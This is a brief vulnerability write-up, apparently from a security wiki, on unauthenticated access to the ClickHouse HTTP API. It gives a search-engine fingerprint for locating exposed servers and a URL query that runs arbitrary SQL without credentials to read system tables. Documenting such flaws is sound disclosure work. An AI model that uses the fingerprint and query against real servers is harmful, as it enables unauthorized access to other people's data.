# ClickHouse API Database Interface Unauthorized Access Vulnerability

## Vulnerability Description

The ClickHouse API database interface has an unauthorized access vulnerability. An attacker can execute any SQL command to obtain database data.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">ClickHouse</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">"ClickHouse" && body="ok"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628562111049-29c2abe1-632c-4b49-8139-c320c7642949.png)

Execute SQL statements

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628562146369-a7f2b43b-64a6-4d94-b003-6df41a71af4e.png)

```php
/?query=SELECT%20*%20FROM%20system.query_thread_log%20LIMIT%201%20FORMAT%20Vertical
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628562659696-09dac222-48dc-47c6-9da8-e22203478a73.png)